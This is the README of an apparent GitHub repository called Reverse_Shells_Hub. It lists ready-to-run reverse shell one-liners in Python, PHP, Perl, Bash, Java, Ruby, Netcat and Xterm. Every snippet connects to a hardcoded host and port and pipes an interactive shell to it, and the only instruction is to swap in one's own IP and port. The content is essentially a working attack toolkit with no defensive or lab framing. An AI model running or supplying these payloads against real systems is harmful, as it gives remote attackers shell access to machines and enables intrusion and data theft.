# Reverse_Shells_Hub - XORPIOv

![](https://github.com/XORPIOv/lib/blob/main/sharingan.png)

**Reverse Shells Hub is a repository containg reverse shells for most used languages**

Download all the Reverse Shells on Linux by the command  
```bash
git clone https://github.com/XORPIOv/reverse_shells.git
```
OR download as **[ZIP FILE](https://github.com/XORPIOv/reverse_shells_hub/archive/refs/heads/main.zip)** for Windows or Linux

## Shells
Find the **latest versions of all the scripts in [the releases page](https://github.com/XORPIOv/reverse_shells.git)**.
## Python
```bash
# XORPIOv PYTHON SHELL | A Reverse Shell in PYTHON.
# Copyright (C) 2024 XORPIOv / https://github.com/XORPIOv
#
# Description
# ------------
# This shell / script will allow you to make an outbound connection to local IP Address and port.
# Change IP Address && PORT to local IP && PORT.

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.22.8",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
## Php
```bash
// XORPIOv PHP SHELL | A Reverse Shell in PHP.
// Copyright (C) 2024 XORPIOv / https://github.com/XORPIOv
//
// Description
// ------------
// Change IP Address && PORT to local IP && PORT.

php -r '$sock=fsockopen("10.0.22.8",2222);exec("/bin/sh -i <&3 >&3 2>&3");'
```
## Perl
```bash
# XORPIOv PERL SHELL | A Reverse Shell in PERL.
# Copyright (C) 2024 XORPIOv / https://github.com/XORPIOv
#
# Description
# ------------
# This shell / script will allow you to make an outbound connection to local IP Address and port.
# Change IP Address && PORT to local IP && PORT.

perl -e 'use Socket;$i="10.0.22.8";$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
## Bash
```bash
# XORPIOv BASH SHELL | A Reverse Shell in BASH.
# Copyright (C) 2024 XORPIOv / https://github.com/XORPIOv
#
# Description
# ------------
# This shell / script will allow you to make an outbound connection to local IP Address and port.
# Change IP Address && PORT to local IP && PORT.

bash -i >& /dev/tcp/10.0.22.8/2222 0>&1
```
## Java
```bash
/*

XORPIOv JAVA SHELL | A Reverse Shell in JAVA.
Copyright (C) 2024 XORPIOv / https://github.com/XORPIOv

Description
------------
This shell / script will allow you to make an outbound connection to local IP Address and port.
Change IP Address && PORT to local IP && PORT.

*/

r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.22.8/2222;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ruby
```bash
# XORPIOv RUBY SHELL | A Reverse Shell in RUBY.
# Copyright (C) 2024 XORPIOv / https://github.com/XORPIOv
#
# Description
# ------------
# This shell / script will allow you to make an outbound connection to local IP Address and port.
# Change IP Address && PORT to local IP && PORT.

ruby -rsocket -e'f=TCPSocket.open("10.0.22.8",2222).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
## Netcat
```bash
# XORPIOv NETCAT SHELL | A Reverse Shell in NETCAT.
# Copyright (C) 2024 XORPIOv / https://github.com/XORPIOv
#
# Description
# ------------
# This shell / script will allow you to make an outbound connection to local IP Address and port.
# Change IP Address && PORT to local IP && PORT.

nc -e /bin/sh 10.0.22.8 2222
```
## Xterm
```bash
# XORPIOv XTERM SHELL | A Reverse Shell in XTERM.
# Copyright (C) 2024 XORPIOv / https://github.com/XORPIOv
#
# Description
# ------------
# This shell / script will allow you to make an outbound connection to local IP Address and port.
# Change IP Address && PORT to local IP && PORT.

xterm -display 10.0.22.8:2222
```

**ReverseShellsHub** will always be updated
